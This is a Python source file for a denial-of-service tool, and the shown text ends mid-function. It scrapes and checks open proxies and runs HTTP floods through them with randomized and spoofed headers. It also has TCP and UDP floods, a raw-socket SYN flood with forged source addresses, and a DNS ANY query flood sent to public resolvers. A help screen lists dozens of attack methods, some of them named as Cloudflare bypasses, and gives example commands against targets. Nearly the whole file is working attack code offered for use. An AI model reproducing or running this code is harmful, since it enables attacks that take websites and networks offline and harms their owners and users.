import os
import sys
import json
import time
import random
import socket
import struct
import ssl
import threading
import concurrent.futures
import urllib.request
import urllib.parse
import urllib.error
import re
import ipaddress
from datetime import datetime
from typing import List, Tuple, Optional, Set, Dict, Any
from queue import Queue
from dataclasses import dataclass
from enum import IntEnum

try:
    import requests
except ImportError:
    requests = None

try:
    import socks as sockslib
except ImportError:
    sockslib = None

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORS = True
except ImportError:
    COLORS = False
    class _DummyFore:
        def __getattr__(self, name):
            return ''
    class _DummyStyle:
        def __getattr__(self, name):
            return ''
    Fore = _DummyFore()
    Style = _DummyStyle()


def c(text: str, color: str = "") -> str:
    if COLORS and color:
        return f"{color}{text}{Style.RESET_ALL}"
    return text


def print_status(msg: str):
    print(f"[{c('+', Fore.GREEN)}] {msg}")


def print_info(msg: str):
    print(f"[{c('*', Fore.CYAN)}] {msg}")


def print_error(msg: str):
    print(f"[{c('!', Fore.RED)}] {msg}")


def print_warn(msg: str):
    print(f"[{c('-', Fore.YELLOW)}] {msg}")


class ProxyType(IntEnum):
    HTTP = 1
    SOCKS4 = 4
    SOCKS5 = 5


@dataclass
class Proxy:
    ip: str
    port: int
    proxy_type: ProxyType
    username: str = ""
    password: str = ""

    def __str__(self) -> str:
        return f"{self.ip}:{self.port}"

    def __hash__(self) -> int:
        return hash((self.ip, self.port, self.proxy_type))

    def __eq__(self, other) -> bool:
        if not isinstance(other, Proxy):
            return False
        return self.ip == other.ip and self.port == other.port and self.proxy_type == other.proxy_type

    def to_url(self) -> str:
        scheme_map = {ProxyType.HTTP: "http", ProxyType.SOCKS4: "socks4", ProxyType.SOCKS5: "socks5"}
        scheme = scheme_map.get(self.proxy_type, "http")
        return f"{scheme}://{self.ip}:{self.port}"

    def to_socks_tuple(self) -> tuple:
        return (self.ip, self.port)


class ProxyUtiles:
    IP_PORT_REGEX = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s*[:\s]\s*(\d{2,5})')
    TABLE_PROXY_REGEX = re.compile(
        r'<td>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td>\s*<td>(\d{2,5})</td>',
        re.IGNORECASE
    )

    @staticmethod
    def parseAll(data: str, proxy_type: ProxyType) -> Set[Proxy]:
        proxies: Set[Proxy] = set()
        if not data:
            return proxies
        for line in data.split('\n'):
            line = line.strip()
            if not line or line.startswith('#') or line.startswith('//'):
                continue
            match = ProxyUtiles.IP_PORT_REGEX.search(line)
            if match:
                try:
                    port = int(match.group(2))
                    if 0 < port < 65536:
                        proxies.add(Proxy(ip=match.group(1), port=port, proxy_type=proxy_type))
                except ValueError:
                    pass
            table_match = ProxyUtiles.TABLE_PROXY_REGEX.search(line)
            if table_match:
                try:
                    port = int(table_match.group(2))
                    if 0 < port < 65536:
                        proxies.add(Proxy(ip=table_match.group(1), port=port, proxy_type=proxy_type))
                except ValueError:
                    pass
        if not proxies:
            for match in ProxyUtiles.IP_PORT_REGEX.finditer(data):
                try:
                    port = int(match.group(2))
                    if 0 < port < 65536:
                        proxies.add(Proxy(ip=match.group(1), port=port, proxy_type=proxy_type))
                except ValueError:
                    pass
        return proxies

    @staticmethod
    def parse_html_table(html: str, proxy_type: ProxyType) -> Set[Proxy]:
        proxies: Set[Proxy] = set()
        for match in ProxyUtiles.TABLE_PROXY_REGEX.finditer(html):
            try:
                port = int(match.group(2))
                if 0 < port < 65536:
                    proxies.add(Proxy(ip=match.group(1), port=port, proxy_type=proxy_type))
            except ValueError:
                pass
        return proxies

    @staticmethod
    def save_proxies_to_file(proxies: Set[Proxy], filepath: str):
        os.makedirs(os.path.dirname(filepath) or '.', exist_ok=True)
        with open(filepath, 'w') as f:
            for p in sorted(proxies, key=lambda x: f"{x.ip}:{x.port}"):
                f.write(f"{p.ip}:{p.port}\n")

    @staticmethod
    def load_proxies_from_file(filepath: str, ptype: ProxyType = ProxyType.SOCKS5) -> Set[Proxy]:
        proxies: Set[Proxy] = set()
        if not os.path.exists(filepath):
            return proxies
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        try:
                            ip, port_str = parts[0], parts[1]
                            port = int(port_str)
                            if 0 < port < 65536:
                                proxies.add(Proxy(ip=ip, port=port, proxy_type=ptype))
                        except ValueError:
                            pass
        return proxies


class ProxyManager:
    def __init__(self, config: dict):
        self.config = config
        self.providers = config.get("proxy-providers", [])
        self.proxy_dir = config.get("proxy-directory", "files/proxies")
        self.all_proxies: Set[Proxy] = set()
        self.lock = threading.Lock()
        os.makedirs(self.proxy_dir, exist_ok=True)

    def download_from_provider(self, provider: dict) -> List[Proxy]:
        url = provider.get("url", "")
        timeout = provider.get("timeout", 7)
        proxy_type = ProxyType(provider.get("type", 5))
        proxies: List[Proxy] = []
        try:
            req = urllib.request.Request(
                url,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                data = resp.read().decode('utf-8', errors='replace')
            parsed = ProxyUtiles.parseAll(data, proxy_type)
            if not parsed and ('<table' in data or '<td' in data):
                parsed = ProxyUtiles.parse_html_table(data, proxy_type)
            if not parsed:
                for match in ProxyUtiles.IP_PORT_REGEX.finditer(data):
                    try:
                        port = int(match.group(2))
                        if 0 < port < 65536:
                            parsed.add(Proxy(ip=match.group(1), port=port, proxy_type=proxy_type))
                    except ValueError:
                        pass
            proxies = list(parsed)
            if proxies:
                print_status(f"Downloaded {len(proxies)} {proxy_type.name} proxies from {url.split('/')[2]}")
        except Exception as e:
            print_warn(f"Failed to download from {url.split('/')[2]}: {e}")
        return proxies

    def download_all(self) -> int:
        print_info("Downloading proxies from all providers...")
        all_proxies: Set[Proxy] = set()
        total_downloaded = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(self.download_from_provider, p): p for p in self.providers}
            for future in concurrent.futures.as_completed(futures):
                proxies = future.result()
                with self.lock:
                    for p in proxies:
                        if p not in all_proxies:
                            all_proxies.add(p)
                            total_downloaded += 1
        self.all_proxies = all_proxies
        print_status(f"Total unique proxies collected: {len(all_proxies)}")
        return len(all_proxies)

    def validate_proxy(self, proxy: Proxy, test_url: str = "http://httpbin.org/ip", timeout: int = 5) -> bool:
        if requests is None:
            return True
        try:
            proxies_dict = {
                'http': proxy.to_url(),
                'https': proxy.to_url().replace('http://', 'https://')
            }
            resp = requests.get(
                test_url, proxies=proxies_dict, timeout=timeout,
                headers={'User-Agent': 'Mozilla/5.0'}, verify=False
            )
            return resp.status_code == 200
        except Exception:
            return False

    def validate_all(self, max_workers: int = 50, test_url: str = "http://httpbin.org/ip") -> Set[Proxy]:
        print_info(f"Validating {len(self.all_proxies)} proxies...")
        valid: Set[Proxy] = set()
        validated = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {}
            for proxy in self.all_proxies:
                future = executor.submit(self.validate_proxy, proxy, test_url)
                futures[future] = proxy
            for future in concurrent.futures.as_completed(futures):
                proxy = futures[future]
                validated += 1
                if future.result():
                    valid.add(proxy)
                if validated % 500 == 0:
                    print_info(f"Validated {validated}/{len(self.all_proxies)} proxies, {len(valid)} working")
        print_status(f"Working proxies: {len(valid)}/{len(self.all_proxies)}")
        return valid

    def save_by_type(self, proxies: Set[Proxy]):
        for ptype in [ProxyType.HTTP, ProxyType.SOCKS4, ProxyType.SOCKS5]:
            type_proxies = {p for p in proxies if p.proxy_type == ptype}
            if type_proxies:
                filename = f"{ptype.name.lower()}.txt"
                filepath = os.path.join(self.proxy_dir, filename)
                ProxyUtiles.save_proxies_to_file(type_proxies, filepath)
                print_status(f"Saved {len(type_proxies)} {ptype.name} proxies to {filepath}")

    def get_proxy_list_file(self, socks_type: int) -> str:
        ptype = ProxyType(socks_type) if socks_type in [1, 4, 5] else ProxyType.SOCKS5
        filename = f"{ptype.name.lower()}.txt"
        return os.path.join(self.proxy_dir, filename)

    def handle_proxy_list(self, socks_type: int) -> str:
        socks_type = socks_type if socks_type in [1, 4, 5] else 5
        self.download_all()
        self.save_by_type(self.all_proxies)
        return self.get_proxy_list_file(socks_type)


class Methods:
    LAYER7_METHODS = [
        "bypass", "cf-bypass", "http-get", "http-post", "http-head",
        "http-options", "http-trace", "http-put", "http-delete",
        "http-patch", "http-get-flood", "http-post-flood",
        "slow-read", "slow-send", "slowloris", "ping-of-death",
        "r00t", "torrent", "dgb", "ev-post", "http2-flood",
        "cf-socket", "http-socket", "tls-socket", "browser",
        "request", "http-flood", "cf-bypass2", "premium",
        "strike", "storm", "bomb", "http-spoof",
        "http-raw", "cf-bypass3"
    ]

    LAYER4_METHODS = [
        "tcp-flood", "udp-flood", "syn-flood", "ack-flood",
        "syn-ack-flood", "fin-flood", "rst-flood", "xmas-flood",
        "icmp-echo", "icmp-flood", "dns-flood", "ntp-flood",
        "sntp-flood", "ssdp-flood", "chargen-flood",
        "memcache-flood", "ldap-flood", "portmap-flood",
        "arduino-flood", "siege", "quake-flood",
        "mssql-flood", "minecraft-flood", "ts3-flood"
    ]

    LAYER4_AMP = [m for m in LAYER4_METHODS if "flood" in m]
    ALL_METHODS = LAYER7_METHODS + LAYER4_METHODS

    @staticmethod
    def is_layer7(method: str) -> bool:
        return method.lower() in Methods.LAYER7_METHODS

    @staticmethod
    def is_layer4(method: str) -> bool:
        return method.lower() in Methods.LAYER4_METHODS


class HttpFlood:
    def __init__(self, target_url: str, threads: int, proxy_file: str,
                 rpc: int, duration: int, method: str = "bypass"):
        self.target_url = target_url
        self.parsed_url = urllib.parse.urlparse(target_url)
        self.host = self.parsed_url.hostname or ""
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == "https" else 80)
        self.ssl = self.parsed_url.scheme == "https"
        self.path = self.parsed_url.path or "/"
        if self.parsed_url.query:
            self.path += "?" + self.parsed_url.query
        self.threads = threads
        self.rpc = rpc
        self.duration = duration
        self.method = method.lower()
        self.proxy_file = proxy_file
        self.proxies: List[Proxy] = []
        self.proxy_index = 0
        self.proxy_lock = threading.Lock()
        self.user_agents: List[str] = []
        self.referers: List[str] = []
        self.load_user_agents()
        self.load_referers()
        self.load_proxies()
        self.running = True
        self.start_time = 0
        self.requests_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.stats_lock = threading.Lock()

    def load_user_agents(self, filepath: str = "files/useragent.txt"):
        try:
            if os.path.exists(filepath):
                with open(filepath, 'r') as f:
                    self.user_agents = [line.strip() for line in f if line.strip()]
        except Exception:
            pass
        if not self.user_agents:
            self.user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]

    def load_referers(self, filepath: str = "files/referers.txt"):
        try:
            if os.path.exists(filepath):
                with open(filepath, 'r') as f:
                    self.referers = [line.strip() for line in f if line.strip()]
        except Exception:
            pass
        if not self.referers:
            self.referers = ["https://www.google.com/"]

    def load_proxies(self):
        if os.path.exists(self.proxy_file):
            with open(self.proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            try:
                                proxy = Proxy(ip=parts[0], port=int(parts[1]), proxy_type=ProxyType.SOCKS5)
                                self.proxies.append(proxy)
                            except (ValueError, IndexError):
                                pass
        if not self.proxies:
            print_warn("No proxies loaded! Continuing without proxies.")
            self.proxies.append(Proxy(ip="127.0.0.1", port=9050, proxy_type=ProxyType.SOCKS5))
        random.shuffle(self.proxies)
        print_status(f"Loaded {len(self.proxies)} proxies for attack")

    def get_next_proxy(self) -> Optional[Proxy]:
        with self.proxy_lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.proxy_index % len(self.proxies)]
            self.proxy_index += 1
            return proxy

    def get_random_headers(self) -> dict:
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr,fr-FR;q=0.9', 'de,de-DE;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': random.choice(['keep-alive', 'close']),
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
        }
        if self.referers:
            headers['Referer'] = random.choice(self.referers)
        if random.random() < 0.3:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        if random.random() < 0.2:
            headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        return headers

    def build_request(self) -> bytes:
        headers = self.get_random_headers()
        method_str = self.method.upper().replace('-', '_').replace('HTTP_', '') if self.method.startswith('http-') else 'GET'
        req = f"{method_str} {self.path} HTTP/1.1\r\n"
        req += f"Host: {self.host}\r\n"
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
        req += "\r\n"
        return req.encode()

    def worker_requests(self, worker_id: int):
        if requests is None:
            return
        while self.running and (time.time() - self.start_time) < self.duration:
            sent_in_cycle = 0
            for _ in range(self.rpc):
                if not self.running or (time.time() - self.start_time) >= self.duration:
                    break
                try:
                    proxy = self.get_next_proxy()
                    if proxy is None:
                        continue
                    proxy_url = proxy.to_url()
                    proxies_dict = {'http': proxy_url, 'https': proxy_url.replace('http://', 'https://')}
                    headers = self.get_random_headers()
                    resp = requests.get(self.target_url, proxies=proxies_dict, headers=headers, timeout=5, verify=False)
                    with self.stats_lock:
                        self.requests_sent += 1
                        self.bytes_sent += len(resp.content)
                    sent_in_cycle += 1
                except Exception:
                    with self.stats_lock:
                        self.errors += 1
            if sent_in_cycle < self.rpc and self.running:
                time.sleep(0.1)

    def worker_raw_socket(self, worker_id: int):
        while self.running and (time.time() - self.start_time) < self.duration:
            sent_in_cycle = 0
            for _ in range(self.rpc):
                if not self.running or (time.time() - self.start_time) >= self.duration:
                    break
                sock = None
                try:
                    proxy = self.get_next_proxy()
                    if proxy is None:
                        continue
                    request_data = self.build_request()
                    if sockslib and proxy.proxy_type in [ProxyType.SOCKS4, ProxyType.SOCKS5]:
                        sock = sockslib.socksocket()
                        sock.set_proxy(
                            sockslib.SOCKS5 if proxy.proxy_type == ProxyType.SOCKS5 else sockslib.SOCKS4,
                            proxy.ip, proxy.port
                        )
                        sock.settimeout(5)
                        sock.connect((self.host, self.port))
                    else:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        sock.connect((self.host, self.port))
                    if self.ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=self.host)
                    sock.sendall(request_data)
                    try:
                        response = sock.recv(4096)
                        with self.stats_lock:
                            self.requests_sent += 1
                            self.bytes_sent += len(response)
                    except socket.timeout:
                        with self.stats_lock:
                            self.requests_sent += 1
                    sock.close()
                    sent_in_cycle += 1
                except Exception:
                    with self.stats_lock:
                        self.errors += 1
                    if sock:
                        try:
                            sock.close()
                        except Exception:
                            pass
            if sent_in_cycle == 0 and self.running:
                time.sleep(0.5)
            elif sent_in_cycle < self.rpc and self.running:
                time.sleep(0.05)

    def start(self) -> Dict[str, Any]:
        self.start_time = time.time()
        raw_methods = ["bypass", "cf-bypass", "http-socket", "cf-socket",
                       "tls-socket", "http-raw", "slow-read", "slow-send",
                       "slowloris", "browser", "strike", "storm", "bomb",
                       "http-spoof", "cf-bypass3"]
        use_raw = self.method in raw_methods
        worker_target = self.worker_raw_socket if use_raw else self.worker_requests
        print_info(f"Starting {self.method} attack on {self.target_url}")
        print_info(f"Threads: {self.threads}, RPC: {self.rpc}, Duration: {self.duration}s")
        print_info(f"Workers: {'Raw Socket' if use_raw else 'Requests Library'}")
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=worker_target, args=(i,), daemon=True)
            t.start()
            threads.append(t)
        try:
            while self.running and (time.time() - self.start_time) < self.duration:
                elapsed = int(time.time() - self.start_time)
                remaining = max(0, self.duration - elapsed)
                with self.stats_lock:
                    rps = self.requests_sent / max(1, elapsed)
                    bps = self.bytes_sent / max(1, elapsed)
                stats = (
                    f"[{elapsed}s/{self.duration}s] "
                    f"Requests: {self.requests_sent} | "
                    f"RPS: {rps:.1f} | "
                    f"Bandwidth: {bps/1024:.1f} KB/s | "
                    f"Errors: {self.errors} | "
                    f"Remaining: {remaining}s"
                )
                print_status(stats)
                time.sleep(2)
        except KeyboardInterrupt:
            self.running = False
            print_warn("\nInterrupted by user")
        self.running = False
        for t in threads:
            t.join(timeout=1)
        elapsed = time.time() - self.start_time
        return {
            "method": self.method,
            "target": self.target_url,
            "duration": elapsed,
            "requests_sent": self.requests_sent,
            "bytes_sent": self.bytes_sent,
            "errors": self.errors,
            "avg_rps": self.requests_sent / max(1, elapsed),
            "avg_bps": self.bytes_sent / max(1, elapsed),
        }


class Layer4:
    def __init__(self, target_ip: str, target_port: int, threads: int,
                 duration: int, method: str = "tcp-flood", proxy_file: str = ""):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.duration = duration
        self.method = method.lower()
        self.proxy_file = proxy_file
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            resolved = self.resolve_hostname(target_ip)
            if resolved:
                self.target_ip = resolved
                print_info(f"Resolved {target_ip} -> {self.target_ip}")
            else:
                raise ValueError(f"Could not resolve {target_ip}")
        self.running = True
        self.start_time = 0
        self.packets_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.stats_lock = threading.Lock()

    def resolve_hostname(self, hostname: str) -> Optional[str]:
        try:
            return socket.gethostbyname(hostname)
        except socket.gaierror:
            return None

    def worker_tcp(self, worker_id: int):
        while self.running and (time.time() - self.start_time) < self.duration:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_ip, self.target_port))
                data = os.urandom(random.randint(64, 1024))
                sock.sendall(data)
                with self.stats_lock:
                    self.packets_sent += 1
                    self.bytes_sent += len(data)
                sock.close()
            except Exception:
                with self.stats_lock:
                    self.errors += 1
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def worker_udp(self, worker_id: int):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running and (time.time() - self.start_time) < self.duration:
            try:
                data = os.urandom(random.randint(64, 1400))
                sock.sendto(data, (self.target_ip, self.target_port))
                with self.stats_lock:
                    self.packets_sent += 1
                    self.bytes_sent += len(data)
            except Exception:
                with self.stats_lock:
                    self.errors += 1

    def _checksum(self, data: bytes) -> int:
        if len(data) % 2 != 0:
            data += b'\x00'
        total = 0
        for i in range(0, len(data), 2):
            total += (data[i] << 8) + data[i + 1]
        total = (total >> 16) + (total & 0xFFFF)
        total += total >> 16
        return ~total & 0xFFFF

    def worker_syn(self, worker_id: int):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            print_warn("SYN flood requires root privileges, falling back to TCP")
            self.worker_tcp(worker_id)
            return
        while self.running and (time.time() - self.start_time) < self.duration:
            try:
                src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                seq_num = random.randint(0, 2**32 - 1)
                tcp_header = struct.pack('!HHIIBBHHH',
                    src_port, self.target_port, seq_num, 0,
                    5 << 4, 0x02, 65535, 0, 0
                )
                pseudo = struct.pack('!4s4sBBH',
                    socket.inet_aton(src_ip), socket.inet_aton(self.target_ip),
                    0, socket.IPPROTO_TCP, len(tcp_header)
                )
                checksum = self._checksum(pseudo + tcp_header)
                tcp_header = struct.pack('!HHIIBBHHH',
                    src_port, self.target_port, seq_num, 0,
                    5 << 4, 0x02, 65535, checksum, 0
                )
                ip_header = struct.pack('!BBHHHBBH4s4s',
                    0x45, 0, 40, random.randint(0, 65535), 0, 64,
                    socket.IPPROTO_TCP, 0,
                    socket.inet_aton(src_ip), socket.inet_aton(self.target_ip)
                )
                packet = ip_header + tcp_header
                sock.sendto(packet, (self.target_ip, 0))
                with self.stats_lock:
                    self.packets_sent += 1
                    self.bytes_sent += len(packet)
            except Exception:
                with self.stats_lock:
                    self.errors += 1

    def worker_dns(self, worker_id: int):
        resolvers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
                     "208.67.222.222", "208.67.220.220", "9.9.9.9"]
        domain = random.choice([
            "isc.org", "google.com", "facebook.com", "cloudflare.com",
            "amazon.com", "microsoft.com", "apple.com", "netflix.com"
        ])
        tid = random.randint(0, 65535)
        flags = 0x0100
        qdcount = 1
        dns_header = struct.pack('!HHHHHH', tid, flags, qdcount, 0, 0, 0)
        dns_query = b''
        for part in domain.split('.'):
            dns_query += struct.pack('B', len(part)) + part.encode()
        dns_query += b'\x00'
        dns_query += struct.pack('!HH', 255, 1)
        packet = dns_header + dns_query
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running and (time.time() - self.start_time) < self.duration:
            try:
                resolver = random.choice(resolvers)
                sock.sendto(packet, (resolver, 53))
                with self.stats_lock:
                    self.packets_sent += 1
                    self.bytes_sent += len(packet)
            except Exception:
                with self.stats_lock:
                    self.errors += 1

    def start(self) -> Dict[str, Any]:
        self.start_time = time.time()
        worker_map = {
            'tcp': self.worker_tcp, 'tcp-flood': self.worker_tcp,
            'udp': self.worker_udp, 'udp-flood': self.worker_udp,
            'syn': self.worker_syn, 'syn-flood': self.worker_syn,
            'dns': self.worker_dns, 'dns-flood': self.worker_dns,
        }
        worker_fn = worker_map.get(self.method, self.worker_tcp)
        print_info(f"Starting {self.method} on {self.target_ip}:{self.target_port}")
        print_info(f"Threads: {self.threads}, Duration: {self.duration}s")
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=worker_fn, args=(i,), daemon=True)
            t.start()
            threads.append(t)
        try:
            while self.running and (time.time() - self.start_time) < self.duration:
                elapsed = int(time.time() - self.start_time)
                remaining = max(0, self.duration - elapsed)
                with self.stats_lock:
                    pps = self.packets_sent / max(1, elapsed)
                    bps = self.bytes_sent / max(1, elapsed)
                stats = (
                    f"[{elapsed}s/{self.duration}s] "
                    f"Packets: {self.packets_sent} | "
                    f"PPS: {pps:.1f} | "
                    f"Bandwidth: {bps/1024:.1f} KB/s | "
                    f"Errors: {self.errors} | "
                    f"Remaining: {remaining}s"
                )
                print_status(stats)
                time.sleep(2)
        except KeyboardInterrupt:
            self.running = False
            print_warn("\nInterrupted by user")
        self.running = False
        for t in threads:
            t.join(timeout=1)
        elapsed = time.time() - self.start_time
        return {
            "method": self.method,
            "target": f"{self.target_ip}:{self.target_port}",
            "duration": elapsed,
            "packets_sent": self.packets_sent,
            "bytes_sent": self.bytes_sent,
            "errors": self.errors,
            "avg_pps": self.packets_sent / max(1, elapsed),
            "avg_bps": self.bytes_sent / max(1, elapsed),
        }


class Tools:
    @staticmethod
    def check_dependencies():
        missing = []
        try:
            import requests
        except ImportError:
            missing.append("requests")
        try:
            import socks
        except ImportError:
            missing.append("PySocks")
        try:
            from colorama import init
        except ImportError:
            missing.append("colorama")
        return missing

    @staticmethod
    def resolve_target(target: str, port: int = 0) -> Tuple[str, int]:
        if target.startswith('http://') or target.startswith('https://'):
            parsed = urllib.parse.urlparse(target)
            host = parsed.hostname or target
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            try:
                ip = socket.gethostbyname(host)
                return (ip, port)
            except socket.gaierror:
                return (host, port)
        if ':' in target:
            parts = target.split(':')
            if len(parts) == 2:
                try:
                    port = int(parts[1])
                    return (parts[0], port)
                except ValueError:
                    pass
        return (target, port)

    @staticmethod
    def parse_target(target: str) -> dict:
        result = {"original": target, "scheme": "", "host": "", "port": 0, "path": "/", "ip": ""}
        if target.startswith('http://') or target.startswith('https://'):
            parsed = urllib.parse.urlparse(target)
            result["scheme"] = parsed.scheme
            result["host"] = parsed.hostname or ""
            result["port"] = parsed.port or (443 if parsed.scheme == 'https' else 80)
            result["path"] = parsed.path or "/"
            if parsed.query:
                result["path"] += "?" + parsed.query
        elif ':' in target:
            parts = target.split(':')
            result["host"] = parts[0]
            try:
                result["port"] = int(parts[1])
            except ValueError:
                result["port"] = 80
            result["scheme"] = "https" if result["port"] == 443 else "http"
        else:
            result["host"] = target
            result["port"] = 80
            result["scheme"] = "http"
        try:
            result["ip"] = socket.gethostbyname(result["host"])
        except socket.gaierror:
            result["ip"] = result["host"]
        return result

    @staticmethod
    def format_results(results: Dict[str, Any]) -> str:
        lines = ["=" * 60, f"Attack Complete - {results.get('method', 'unknown').upper()}", "=" * 60]
        for key, val in results.items():
            if key == 'method':
                continue
            key_str = key.replace('_', ' ').title()
            if 'bps' in key.lower() or 'rate' in key.lower():
                if isinstance(val, (int, float)):
                    if val > 1_000_000:
                        lines.append(f"  {key_str}: {val/1_000_000:.2f} MB/s")
                    elif val > 1_000:
                        lines.append(f"  {key_str}: {val/1_000:.2f} KB/s")
                    else:
                        lines.append(f"  {key_str}: {val:.2f}")
                else:
                    lines.append(f"  {key_str}: {val}")
            else:
                lines.append(f"  {key_str}: {val}")
        lines.append("=" * 60)
        return '\n'.join(lines)


class ToolsConsole:
    BANNER = """
    ███    ███ ██   ██ ██████   ██████  ██████  ███████
    ████  ████ ██   ██ ██   ██ ██      ██   ██ ██
    ██ ████ ██ ███████ ██   ██ ██      ██   ██ ███████
    ██  ██  ██ ██   ██ ██   ██ ██      ██   ██      ██
    ██      ██ ██   ██ ██████   ██████  ██████  ███████
    ====================================================
      FUCK THE | SHIT
    ====================================================
    """

    @staticmethod
    def print_banner():
        print(c(ToolsConsole.BANNER, Fore.CYAN))

    @staticmethod
    def print_help():
        help_text = f"""
{c('USAGE:', Fore.YELLOW)}
    python3 ale.py <method> <target> <socks_type> <threads> <proxyfile> <rpc> <duration>

{c('LAYER 7 METHODS (HTTP/HTTPS):', Fore.GREEN)}
    bypass, cf-bypass, http-get, http-post, http-head, http-options,
    http-trace, http-put, http-delete, http-patch, http-get-flood,
    http-post-flood, slow-read, slow-send, slowloris, r00t, torrent,
    dgb, ev-post, http2-flood, cf-socket, http-socket, tls-socket,
    browser, request, http-flood, cf-bypass2, premium, strike, storm,
    bomb, http-spoof, http-raw, cf-bypass3

{c('LAYER 4 METHODS (TCP/UDP):', Fore.YELLOW)}
    tcp-flood, udp-flood, syn-flood, ack-flood, fin-flood, rst-flood,
    xmas-flood, icmp-echo, icmp-flood, dns-flood, ntp-flood, ssdp-flood,
    memcache-flood, ldap-flood, portmap-flood, siege, quake-flood

{c('EXAMPLES:', Fore.CYAN)}
    python3 ale.py bypass https://example.com 5 500 auto 100 120
    python3 ale.py http-get https://example.com 5 200 socks5.txt 50 60
    python3 ale.py cf-bypass https://target.com 5 1000 auto 100 180
    python3 ale.py tcp-flood 192.168.1.100:80 5 5000 auto 300
    python3 ale.py udp-flood example.com:53 5 10000 auto 120

{c('ARGUMENTS:', Fore.MAGENTA)}
    method      - Attack method from the lists above
    target      - URL (http(s)://...) or IP:Port or Domain:Port
    socks-type  - Proxy type: 1=HTTP, 4=SOCKS4, 5=SOCKS5 (default: 5)
    threads     - Number of concurrent threads (default: 1000)
    proxyfile   - Path to proxy file, or 'auto' to auto-download (default: auto)
    rpc         - Requests per connection/cycle (Layer 7 only, default: 100)
    duration    - Attack duration in seconds (default: 120)
"""
        print(help_text)

    @staticmethod
    def load_config(config_path: str = "config.json") -> dict:
        default_config = {
            "proxy-providers": [],
            "user-agent-file": "files/useragent.txt",
            "referrer-file": "files/referers.txt",
            "proxy-directory": "files/proxies/",
            "default-threads": 1000,
            "default-rpc": 100,
            "default-duration": 120,
            "socks-type": 5
        }
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    config = json.load(f)
                    for k, v in default_config.items():
                        if k not in config:
                            config[k] = v
                    return config
            except json.JSONDecodeError:
                print_error("Failed to parse config.json")
                return default_config
        else:
            print_warn("config.json not found, using defaults")
            return default_config

    @staticmethod
    def run():
        ToolsConsole.print_banner()
        config = ToolsConsole.load_config()
        if len(sys.argv) < 3 or sys.argv[1] in ('-h', '--help', 'help'):
            ToolsConsole.print_help()
            return
        method = sys.argv[1].lower()
        target = sys.argv[2]
        socks_type = 5
        threads = None
        proxyfile = None
        rpc = None
        duration = None
        arg_idx = 3
        if len(sys.argv) > arg_idx:
            try:
                socks_type = int(sys.argv[arg_idx])
                arg_idx += 1
            except ValueError:
                socks_type = config.get("socks-type", 5)
        if len(sys.argv) > arg_idx:
            try:
                threads = int(sys.argv[arg_idx])
                arg_idx += 1
            except ValueError:
                pass
        if len(sys.argv) > arg_idx:
            proxyfile = sys.argv[arg_idx]
            arg_idx += 1
        if len(sys.argv) > arg_idx and Methods.is_layer7(method):
            try:
                rpc = int(sys.argv[arg_idx])
                arg_idx += 1
            except ValueError:
                pass
        if len(sys.argv) > arg_idx:
            try:
                duration = int(sys.argv[arg_idx])
                arg_idx += 1
            except ValueError:
                pass
        if threads is None:
            threads = config.get("default-threads", 1000)
        if rpc is None and Methods.is_layer7(method):
            rpc = config.get("default-rpc", 100)
        if duration is None:
            duration = config.get("default-duration", 120)
        if proxyfile == "auto" or proxyfile is None:
            print_info("Auto-downloading proxies from providers...")
            pm = ProxyManager(config)
            proxyfile = pm.handle_proxy_list(socks_type)
            print_status(f"Proxies saved to {proxyfile}")
        elif proxyfile and not os.path.exists(proxyfile):
            alt_path = os.path.join(config.get("proxy-directory", "files/proxies/"), proxyfile)
            if os.path.exists(alt_path):
                proxyfile = alt_path
            else:
